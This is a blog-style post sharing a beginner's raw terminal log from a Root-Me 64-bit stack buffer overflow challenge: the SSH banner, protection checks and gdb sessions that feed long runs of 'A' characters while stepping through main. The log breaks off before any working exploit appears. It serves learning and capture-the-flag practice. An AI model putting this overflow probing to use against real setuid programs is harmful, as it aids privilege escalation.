
N00b, I'm noob! This is a basic challenge, but I'm down-at-heel because of it! So I decided to save logs of my terminal, which capture all of things I try, create, and do anyway to get flag! :D

If you are interested with my log, before you take it, let's read this file http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf, it's very usefull and exciting!

OK! This is my log, it's seen stupid :D 

Notice that: public is forbiden so I replaced vulverable information by special charater like: *,&,.. 

haniz@Cons:~$ ssh -p 2223 ***@challenge03.***
      _           _ _                        ___ _____ 
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ / 
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | ||_ \ 
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| |__) |
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/____/ 
                                 |___/ &&&    

***@challenge03.***'s password: 
     
                                     ██▒ ▒██░    
                                 ░███░ █ █ ░███▒    
                             ░███░        ▓     ███░    
                           ▓█▓       ▓█░  ▓       ▓███    
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██    
                        ██  ███  ▒░       ▓░████░██    ▓█░    
                       ██   ▒██      ███      ░▓██      ▒█    
                      ██             ░█░      ░██        ▓█    
                     ░█████████████    █     ██░          █▓    
                     ██                 █ ░██             ██    
                     ██      ░         ░██▓               ██    
                     ██  ███    ░██▓░███                 ███    
                     ▒█          ▓██▓                  ░████    
                      █▓    ░████                    ░██ ▒█    
                      ▓█████░                      ███ ███▓    
                      ▓███                      █████░ ████    
                       ▓█     ░██▓░         ▒████████░  ██    
                       ▓█      ██░▒██████████████████░  ██    
                       ▓█       ███▓██▒  ░██████████░   ██    
                       ▓█                  ░████▒       ██    
                        ░██▓           ▒█▓           ▒██░    
                           ▒██░       ██ ▒█        ██▓    
                              █▒                  █    
                              █▒  ░█    █░   █▓   █    
                              █████████████████████    
     



------------------------------------------------------------------------------------------------
    Welcome on challenge03    /
-----------------------------‘

/tmp and /var/tmp are writeable

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, ROPgadget, radare2, pwntools

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.

------------------------------------------------------------------------------------------------
    Challenge informations   /
----------------------------‘

./ch35: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=f975007be77dd131c99b72b1545891206907629a, not stripped

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./ch35

ASLR is ON


***@challenge03:~$ gdb ./ch35 
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ch35...(no debugging symbols found)...done.
warning: ~/.gdbinit.local: No such file or directory
gdb$ shell python -c 'print "A"*256' > /tmp/py
gdb$ r < /tmp/py
Starting program: /challenge/app-systeme/ch35/ch35 < /tmp/py
warning: Cannot call inferior functions, Linux kernel PaX protection forbids return to non-executable pages!
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 12800) exited normally]
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX:Error while running hook_stop:
No registers.
gdb$ b main
Breakpoint 1 at 0x400700
gdb$ r < /tmp/py
Starting program: /challenge/app-systeme/ch35/ch35 < /tmp/py
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859C30  o d I t s Z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003AACB859D18  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x0000000000400700
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400700 <main+4>:	sub    rsp,0x120
   0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
-----------------------------------------------------------------------------------------------------------------------------

Breakpoint 1, 0x0000000000400700 in main ()
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003AACB859D18  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x0000000000400707
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400707 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003AACB859D18  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x000000000040070D
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040070d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003AACB859D18  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x0000000000400714
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400714 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003AACB859D18  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x000000000040071B
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071b in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003AACB859B20  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x000000000040071E
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x000003AACB859B20  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x0000000000400723
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400723 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x000003AACB859B20  RDX: 0x000003AACB859D28  RCX: 0x0000000000000000  RIP: 0x0000000000400728
  R8 : 0x000002BDF12D7E80  R9 : 0x000002BDF12ED530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400728 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000001  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x000002BDF12D7640  RSI: 0x000002BDF12D89F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x000000000040072D
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040072d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x000002BDF12D7640  RSI: 0x000002BDF12D89F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400734
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400734 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a p c 
  RDI: 0x000003AACB859B20  RSI: 0x000002BDF12D89F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400737
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400737 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000100  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a P c 
  RDI: 0x000003AACB859B20  RSI: 0x0000000000000000  RDX: 0x0000000000000020  RCX: 0xC0FFFFC100000000  RIP: 0x000000000040073C
  R8 : 0x000000000000FFC1  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073c in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000100  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a P c 
  RDI: 0x000003AACB859B20  RSI: 0x0000000000000000  RDX: 0x0000000000000020  RCX: 0xC0FFFFC100000000  RIP: 0x000000000040073F
  R8 : 0x000000000000FFC1  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073f in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a P c 
  RDI: 0x000003AACB859B20  RSI: 0x0000000000000000  RDX: 0x0000000000000020  RCX: 0xC0FFFFC100000000  RIP: 0x0000000000400746
  R8 : 0x000000000000FFC1  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400746 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a P c 
  RDI: 0x000003AACB859B20  RSI: 0x000003AACB859B20  RDX: 0x0000000000000020  RCX: 0xC0FFFFC100000000  RIP: 0x0000000000400749
  R8 : 0x000000000000FFC1  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400749 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003AACB859B20  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a P c 
  RDI: 0x00000000004007F1  RSI: 0x000003AACB859B20  RDX: 0x0000000000000020  RCX: 0xC0FFFFC100000000  RIP: 0x000000000040074E
  R8 : 0x000000000000FFC1  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040074e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003AACB859C30  RSP: 0x000003AACB859B10  o d I t s z a P c 
  RDI: 0x00000000004007F1  RSI: 0x000003AACB859B20  RDX: 0x0000000000000020  RCX: 0xC0FFFFC100000000  RIP: 0x0000000000400753
  R8 : 0x000000000000FFC1  R9 : 0x0000000000000000  R10: 0x000003AACB859C20  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003AACB859D10  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400753 in main ()
gdb$ layout regs
***@challenge03:~$ 
***@challenge03:~$ gdb ./ch35 
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ch35...(no debugging symbols found)...done.
warning: ~/.gdbinit.local: No such file or directory
gdb$ shell python 0c 'print "A"*264' >/tmp/py
python: can't open file '0c': [Errno 2] No such file or directory
gdb$ shell python -c 'print "A"*264' >/tmp/py
gdb$ b main
Breakpoint 1 at 0x400700
gdb$ r < /tmp/py
Starting program: /challenge/app-systeme/ch35/ch35 < /tmp/py
warning: Cannot call inferior functions, Linux kernel PaX protection forbids return to non-executable pages!
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFE90  o d I t s Z a P c 
  RDI: 0x0000000000000001  RSI: 0x0000038FD3DFFF78  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x0000000000400700
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400700 <main+4>:	sub    rsp,0x120
   0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
-----------------------------------------------------------------------------------------------------------------------------

Breakpoint 1, 0x0000000000400700 in main ()
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x0000038FD3DFFF78  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x0000000000400707
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400707 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x0000038FD3DFFF78  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x000000000040070D
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
